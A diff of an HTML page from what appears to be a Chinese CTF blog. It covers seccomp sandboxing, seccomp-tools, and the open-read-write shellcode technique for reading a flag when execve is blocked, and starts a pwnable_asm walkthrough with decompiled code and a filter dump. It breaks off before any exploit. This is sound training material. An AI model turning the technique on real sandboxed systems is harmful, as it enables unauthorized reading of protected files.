@@ -100,12 +100,12 @@ Arashimuのblog = CTFer</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giph4lm9i7j20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhnx9glj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicm0fdw5cj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicm0n457cj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciukx8a7j20zk0m8aio.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li>
         </ul>
       </div>
     </header>
@@ -149,47 +149,70 @@ Arashimuのblog = CTFer</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h1 id="沙盒利用"><a class="markdownIt-Anchor" href="#沙盒利用">#</a> 沙盒利用</h1>
-<h2 id="沙盒"><a class="markdownIt-Anchor" href="#沙盒">#</a> 沙盒</h2>
+    <h1 id="沙盒利用"><a class="markdownIt-Anchor" href="#沙盒利用"></a> 沙盒利用</h1>
+<h2 id="沙盒"><a class="markdownIt-Anchor" href="#沙盒"></a> 沙盒</h2>
 <ul>
-<li>作用：沙盒 (Sandbox) 是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限</li>
+<li>作用：沙盒(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限</li>
 </ul>
-<h2 id="常见函数"><a class="markdownIt-Anchor" href="#常见函数">#</a> 常见函数</h2>
+<h2 id="常见函数"><a class="markdownIt-Anchor" href="#常见函数"></a> 常见函数</h2>
 <ul>
 <li>
-<p><code>Secommp</code>  库：是 Linux 内核 2.6.12 版本引入的安全模块，主要是用来限制某一进程可用的系统调用 (system call)。但它本身不是一种沙盒，一种减少 Linux 内核暴露的机制，是构建一个安全的沙盒的重要组成部分。</p>
+<p><code>Secommp</code>库：是 Linux 内核 2.6.12 版本引入的安全模块，主要是用来限制某一进程可用的系统调用 (system call)。但它本身不是一种沙盒，一种减少 Linux 内核暴露的机制，是构建一个安全的沙盒的重要组成部分。</p>
 <ul>
-<li>作用： <code>Seccomp</code>  在最初引入的时候只支持了 strict mode，意味着只有  <code>read ，write ，_exit ，_sigreturn</code>  四个 system call 会被允许。一旦出现其他的 system call，进程会被立刻终止 。后来又引入了 filter mode 模式，也就是 BPF，这样可调用的函数可以人为控制。</li>
-<li>引入标识<figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/seccomp.h></span></span></pre></td></tr></table></figure></li>
-<li>利用方式：调用 <code>Seccomp</code>  时，基本意味着  <code>execve</code>  这种系统调用被禁用了 ( <code>system</code>  是通过调用 <code>execve</code>  来实现的)，想通过这种方法拿到 shell 不可能。所以考虑利用其他函数来获得 flag，常用的方式就是 orw/p (open-read-write/puts) 来读出 flag (用 open 打开 flag 文件，然后读出 flag，最后向 terminal 写出 flag)</li>
+<li>作用：<code>Seccomp</code> 在最初引入的时候只支持了 strict mode，意味着只有 <code>read ，write ，_exit ，_sigreturn</code>四个 system call 会被允许。一旦出现其他的 system call，进程会被立刻终止 。后来又引入了 filter mode 模式，也就是 BPF，这样可调用的函数可以人为控制。</li>
+<li>引入标识<pre class="highlight"><code class="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span>
+</code></pre>
+</li>
+<li>利用方式：调用<code>Seccomp</code>时，基本意味着 <code>execve</code> 这种系统调用被禁用了(<code>system</code>是通过调用<code>execve</code>来实现的)，想通过这种方法拿到 shell 不可能。所以考虑利用其他函数来获得 flag，常用的方式就是 orw/p(open-read-write/puts)来读出 flag(用 open 打开 flag 文件，然后读出 flag，最后向 terminal 写出 flag)</li>
 </ul>
 </li>
 <li>
-<p><code>prctl</code>  函数</p>
+<p><code>prctl</code>函数</p>
 <ul>
 <li>
 <p>函数原型</p>
-<figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">prctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> option<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg3<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg4<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg5<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//option 选项有很多，剩下的参数也由 option 确定，这里介绍两个主要的 option</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// PR_SET_NO_NEW_PRIVS (38) 和 PR_SET_SECCOMP (22)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">//option 为 38 的情况</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// 此时第二个参数设置为 1，则禁用 execve 系统调用且子进程一样受用</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">//option 为 22 的情况</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// 只允许调用 read/write/_exit (not exit_group)/sigreturn 这几个 syscall</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// 第二个参数为 2，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则。</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure></li>
+<pre class="highlight"><code class="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span></span>;
+
+<span class="hljs-comment">// option选项有很多，剩下的参数也由option确定，这里介绍两个主要的option</span>
+<span class="hljs-comment">// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)</span>
+
+<span class="hljs-comment">// option为38的情况</span>
+<span class="hljs-comment">// 此时第二个参数设置为1，则禁用execve系统调用且子进程一样受用</span>
+<span class="hljs-built_in">prctl</span>(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);
+
+<span class="hljs-comment">// option为22的情况</span>
+<span class="hljs-comment">// 只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</span>
+<span class="hljs-comment">// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。</span>
+<span class="hljs-built_in">prctl</span>(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);
+</code></pre>
+</li>
 </ul>
 </li>
 </ul>
-<h2 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具">#</a> 常用工具</h2>
+<h2 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具"></a> 常用工具</h2>
 <ul>
 <li>
 <p>seccomp-tools</p>
-<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc ruby-dev</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> gem <span class="token function">install</span> seccomp-tools</pre></td></tr></table></figure><ul>
+<pre class="highlight"><code class="shell">sudo apt install gcc ruby-dev
+sudo gem install seccomp-tools
+</code></pre>
+<ul>
 <li>
 <p>常用命令</p>
-<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>seccomp-tools dump file_name</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看文件哪些系统调用被禁用，哪些允许使用</span></pre></td></tr></table></figure></li>
+<pre class="highlight"><code class="shell">seccomp-tools dump file_name
+<span class="hljs-meta prompt_">#</span><span class="language-bash">查看文件哪些系统调用被禁用，哪些允许使用</span>
+</code></pre>
+</li>
 </ul>
 </li>
 </ul>
-<h2 id="orwp-函数参数的深入"><a class="markdownIt-Anchor" href="#orwp-函数参数的深入">#</a> orw/p 函数参数的深入</h2>
+<h2 id="orwp-函数参数的深入"><a class="markdownIt-Anchor" href="#orwp-函数参数的深入"></a> orw/p 函数参数的深入</h2>
 <ul>
 <li>文件标识符：
 <ul>
-<li>默认保留的 3 个：0 - 标准输入 1 - 标准输出 2 - 标准错误</li>
-<li>调用 <code>open</code>  时，文件标识符从 3 开始，每调用一次 + 1，直到 <code>close</code>  时才重置为 3</li>
+<li>默认保留的 3 个：0-标准输入 1-标准输出 2-标准错误</li>
+<li>调用<code>open</code>时，文件标识符从 3 开始，每调用一次+1，直到<code>close</code>时才重置为 3</li>
 </ul>
 </li>
 </ul>
@@ -197,13 +220,23 @@ Arashimuのblog = CTFer</title>
 <li>
 <p>open</p>
 <ul>
-<li>函数定义<figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>pathname<span class="token punctuation">,</span> <span class="token keyword">int</span> oflag<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">/* mode_t mode */</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//pathname: 文件路径</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//oflag: 打开方式 (O_RDONLY: 只读模式、O_WRONLY: 只写模式、 O_RDWR: 读写模式)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 成功返回文件句柄 ，失败返回 - 1</span></pre></td></tr></table></figure></li>
+<li>函数定义<pre class="highlight"><code class="cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">int</span> oflag, ... <span class="hljs-comment">/* mode_t mode */</span>)</span></span>;
+<span class="hljs-comment">//pathname:文件路径</span>
+<span class="hljs-comment">//oflag:打开方式(O_RDONLY:只读模式、O_WRONLY:只写模式、 O_RDWR:读写模式)</span>
+<span class="hljs-comment">//成功返回文件句柄 ，失败返回-1</span>
+</code></pre>
+</li>
 </ul>
 </li>
 <li>
 <p>read</p>
 <ul>
-<li>函数定义<figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//fd: 要读取的文件，如果调用了 open，可以传入文件标识符，也可以打开</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//*buf: 为要将读取的内容保存的缓冲区</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//len: 读入的长度</span></pre></td></tr></table></figure></li>
+<li>函数定义<pre class="highlight"><code class="cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">int</span> len)</span></span>;
+<span class="hljs-comment">//fd:要读取的文件，如果调用了open，可以传入文件标识符，也可以打开</span>
+<span class="hljs-comment">//*buf:为要将读取的内容保存的缓冲区</span>
+<span class="hljs-comment">//len:读入的长度</span>
+</code></pre>
+</li>
 </ul>
 </li>
 <li>
@@ -211,30 +244,90 @@ Arashimuのblog = CTFer</title>
 <ul>
 <li>
 <p>函数定义</p>
-<figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">write</span> <span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//write () 会把参数 buf 所指的内存写入 count 个字节到参数 fd 所指的文件内。当然，文件读写位置也会随之移动.</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 返回值：如果顺利 write () 会返回实际写入的字节数。当有错误发生时则返回 - 1, 错误代码存入 errno 中.</span></pre></td></tr></table></figure></li>
+<pre class="highlight"><code class="cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">write</span> <span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> * buf, <span class="hljs-type">size_t</span> count)</span></span>;
+<span class="hljs-comment">//write()会把参数buf所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.</span>
+<span class="hljs-comment">//返回值：如果顺利write()会返回实际写入的字节数. 当有错误发生时则返回-1, 错误代码存入errno 中.</span>
+</code></pre>
+</li>
 </ul>
 </li>
 <li>
 <p>puts</p>
 <ul>
-<li>输出截断标识 <code>\x00</code></li>
+<li>输出截断标识<code>\x00</code></li>
 </ul>
 </li>
 </ul>
-<h2 id="例题"><a class="markdownIt-Anchor" href="#例题">#</a> 例题</h2>
-<h3 id="pwnable_asm"><a class="markdownIt-Anchor" href="#pwnable_asm">#</a> pwnable_asm</h3>
+<h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2>
+<h3 id="pwnable_asm"><a class="markdownIt-Anchor" href="#pwnable_asm"></a> pwnable_asm</h3>
 <ul>
 <li>
-<p>分析：经典的 orw</p>
+<p>分析：经典的orw</p>
 <p>题目</p>
-<figure class="highlight cpp"><figcaption data-lang="C++"><span>p</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  size_t v3<span class="token punctuation">;</span> <span class="token comment">// rdx</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to shellcoding practice challenge."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"If this does not challenge you. you should play 'asg' challenge :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x41414000</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token function">memcpy</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"give me your x64 shellcode: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">0x3E8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>分析题目，有 sandbox，所以开启了沙盒保护，所以先用 seccomp-tools 检查哪些系统调用被允许。</p>
-<figure class="highlight shell"><figcaption data-lang="Bash"><span>l</span></figcaption><table><tr><td data-num="1"></td><td><pre>seccomp-tools dump ./asm</pre></td></tr><tr><td data-num="2"></td><td><pre>  line  CODE  JT   JF      K</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></pre></td></tr><tr><td data-num="4"></td><td><pre> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch</pre></td></tr><tr><td data-num="5"></td><td><pre> 0001: 0x15 0x00 0x09 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0011</pre></td></tr><tr><td data-num="6"></td><td><pre> 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number</pre></td></tr><tr><td data-num="7"></td><td><pre> 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005</pre></td></tr><tr><td data-num="8"></td><td><pre> 0004: 0x15 0x00 0x06 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0011</pre></td></tr><tr><td data-num="9"></td><td><pre> 0005: 0x15 0x04 0x00 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token builtin class-name">read</span><span class="token punctuation">)</span> goto 0010</pre></td></tr><tr><td data-num="10"></td><td><pre> 0006: 0x15 0x03 0x00 0x00000001  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">write</span><span class="token punctuation">)</span> goto 0010</pre></td></tr><tr><td data-num="11"></td><td><pre> 0007: 0x15 0x02 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0010</pre></td></tr><tr><td data-num="12"></td><td><pre> 0008: 0x15 0x01 0x00 0x0000003c  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token builtin class-name">exit</span><span class="token punctuation">)</span> goto 0010</pre></td></tr><tr><td data-num="13"></td><td><pre> 0009: 0x15 0x00 0x01 0x000000e7  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> exit_group<span class="token punctuation">)</span> goto 0011</pre></td></tr><tr><td data-num="14"></td><td><pre> 0010: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW</pre></td></tr><tr><td data-num="15"></td><td><pre> 0011: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL</pre></td></tr></table></figure><p>发现系统允许调用 <code>read write open</code> ，所以就用 <code>orw</code> ，然后考虑我们应该把 <code>open</code>  出的 <code>flag</code>  读到哪里。注意到</p>
-<p><code>s = (char *)mmap((void *)0x41414000, 0x1000uLL, 7, 50, 0, 0LL)</code> ，表明在 <code>0x41414000</code>  这里开辟了 <code>0x1000</code>  的内存大小。所以考虑读入到 <code>0x41414000</code> 。然后 payload 中使用了 <code>shellcraft</code>  模块来生成 <code>shellcode</code> 。具体怎么使用，以后在具体总结总结</p>
-<p>再说一下 <code>mmap</code>  函数的作用 ( <code>mmap</code> , 从函数名就可以看出来这是 memory map, 即地址的映射，是一种内存映射文件的方法)</p>
-<figure class="highlight cpp"><figcaption data-lang="C++"><span>p</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> start<span class="token punctuation">,</span>size_t length<span class="token punctuation">,</span><span class="token keyword">int</span> prot<span class="token punctuation">,</span><span class="token keyword">int</span> flags<span class="token punctuation">,</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span>off_t offset<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//start: 映射区的开始地址，设置为 0 时表示由系统决定映射区的起始地址。</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 映射区的长度。// 长度单位是 以字节为单位，不足一内存页按一内存页处理 </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 成功执行时，mmap () 返回被映射区的 指针，失败时，mmap () 返回 MAP_FAILED [其值为 (void *)-1]</span></pre></td></tr></table></figure></li>
+<pre class="highlight"><code class="cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span>
+</span>&#123;
+  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rdx</span>
+  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);
+  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to shellcoding practice challenge.&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If this does not challenge you. you should play &#x27;asg&#x27; challenge :)&quot;</span>);
+  s = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">mmap</span>((<span class="hljs-type">void</span> *)<span class="hljs-number">0x41414000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);
+  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">144</span>, <span class="hljs-number">0x1000</span>uLL);
+  v3 = <span class="hljs-built_in">strlen</span>(stub);
+  <span class="hljs-built_in">memcpy</span>(s, stub, v3);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;give me your x64 shellcode: &quot;</span>);
+  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, s + <span class="hljs-number">46</span>, <span class="hljs-number">0x3E8</span>uLL);
+  <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0xA</span>u);
+  <span class="hljs-built_in">chroot</span>(<span class="hljs-string">&quot;/home/asm_pwn&quot;</span>);
+  <span class="hljs-built_in">sandbox</span>(<span class="hljs-string">&quot;/home/asm_pwn&quot;</span>);
+  ((<span class="hljs-built_in">void</span> (__fastcall *)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *))s)(<span class="hljs-string">&quot;/home/asm_pwn&quot;</span>);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
